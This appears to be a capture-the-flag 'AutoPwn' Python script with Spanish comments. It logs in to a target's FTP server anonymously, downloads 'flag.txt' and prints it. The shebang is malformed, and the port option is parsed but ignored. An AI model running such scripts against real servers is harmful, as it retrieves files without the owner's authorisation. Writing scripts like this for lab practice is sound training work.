#/usr/bin/python3

import ftplib
import argparse
from colorama import Fore, Style

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport

    def run(self, ip_address, username, password, filename):
        try:
            # Conexión al servidor FTP
            ftp = ftplib.FTP(self.ip_address)
        
            # Inicio de sesión con nombre de usuario y contraseña
            ftp.login(username, password)
        
            # Descargar el archivo
            with open(filename, 'wb') as file:
                ftp.retrbinary('RETR ' + filename, file.write)
                   
            # Cierre de la conexión FTP
            ftp.quit()
        
        except ftplib.all_errors as e:
            # Manejar cualquier excepción ocurrida durante la ejecución de FTP
            print(Fore.RED + f"Error al conectar al servidor FTP: {str(e)}" + Style.RESET_ALL)

    def read_file(self, filename):
        try:
            # Leer el contenido del archivo
            with open(filename, 'r') as file:
                content = file.read()
            print(Fore.GREEN + f"\nEl contenido del archivo '{filename}': {content}\n" + Style.RESET_ALL)
        except IOError as e:
            # Manejar cualquier excepción ocurrida durante la lectura del archivo
            print(Fore.RED + f"Error al leer el archivo: {str(e)}" + Style.RESET_ALL) 


def get_arguments():
    # Configurar y obtener los argumentos de línea de comandos
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', default=21, dest='lport', required=False, help='Proporcionar puerto.')
    return parser.parse_args()

def main():
    # Obtener los argumentos de línea de comandos
    args = get_arguments()

    # Crear una instancia del objeto Exploit con la IP y el puerto proporcionados
    exploit = Exploit(args.ip_address, args.lport)

    # Definir el nombre de usuario, contraseña y nombre del archivo
    username = "Anonymous"
    password = ""
    filename = "flag.txt"

    # Ejecutar el exploit y leer el archivo
    exploit.run(args.ip_address, username, password, filename)
    exploit.read_file(filename)

if __name__ == '__main__':
    main()

